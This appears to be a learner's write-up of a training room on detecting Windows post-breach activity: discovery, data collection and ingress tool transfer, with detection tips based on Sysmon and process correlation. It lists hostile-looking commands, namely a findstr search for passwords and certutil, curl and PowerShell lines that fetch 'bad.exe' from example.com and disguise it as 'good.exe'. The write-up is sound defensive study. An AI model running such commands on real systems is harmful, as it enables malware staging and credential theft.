# Windows threat detection - Post breach
After breaching a host theat actors have a choice to make, establish a backdoor to maintain access or take immediate action to achieve their objecties. This writeup covers the second approach.

## Detecting Discovery
The first step after breaching a host is to find out what's on it, this tactic is the Discovery tactic (TA0007) and involves trying to find out what is of value and what isn't on a host such as the hosts purpose, is it part of a network and what privileges does it have.

Discovery via command line is the most common method for threat actors due to it's ease of use with commands like whoami or ipconfig. This also makes discovering them because most launched commands are logged as new processes.

The alternative to command line is Discovery via GUI, where threat actors have been able to log in to the system interactively, like after an RDP breach, where they'll use apps and programs, system settings, disk management and even event viewer.

Detecting Discovery involves tracing processes from a Discovery command, since IT also uses many of the same commands, to ensure that the use of this command came from a malicious source by correlating Processid and ParentProcessId fields.

## Collection
The next stage after Discovery covers three more tactics: Collection (TA0009), credential access (TA0006) and exfiltration (TA0040) 

In data collection threat actors still use both command-line and graphical interface options to review sensitive commands. So detecting access to files means tracking commands like:
- notepad.exe
- cmd: type -f | findstr password > C:\Temp\...
- Powershell: Get-ChildItem
- Powershell: copy
- Powershell: Compress-Archive (or alternatively threat actors might use existing archiving software on the system like 7-zip)

Collection is performed in two ways:
1. By a human who breaches a big network and knows what their target and spends a deal of time looking for data to steal
2. Or two by automated stealers, such as Gremlin data stealer, that steal VPN profiles, crypto wallets, web browser sessions, steam, discord and telegram data and takes screenshots of the victims host. These do not use CMD or powershell but instead rely on their own code making it harder to understand which exact data was accessed or stolen.

## ingress tool transfer
Ingress tool transfer (T1105) is a technique where bad actors download additional malware to the breached system. The three most common commans used for this are:
1. Via Certutil: certutil.exe -urlcache -f http://example.com/bad.exe good.exe
2. Via Curl: curl.exe https://example.com/bad.exe -o good.exe
3. Via Powershel IWR: powershell -c "Invoke-WebRequest -Uri 'https://example.com/bad.exe' -OutFile 'good.exe"

Detecting this required tracking a network connection or a DNS requests from the supicious process. Most threat actors try to avoid detection by downloading tools from legit services like GitHub.

## Conclusion
To conclude this room showed the methods of which bad actors use to gain credentials, steal data and exfiltrate as well as how to detect these mthods.

Key Takeaways:

> Discovery usually happens immediately after inital access and can be detected with Sysmon

> Discovery focuses on identifying the victim, but collection focuses on acquiring sensitive data

> At any time of the attack, threat actors can exfiltrate the stolen data or download new malware

> Threat actors do not start with all the tools they need but download new malware only if necessary
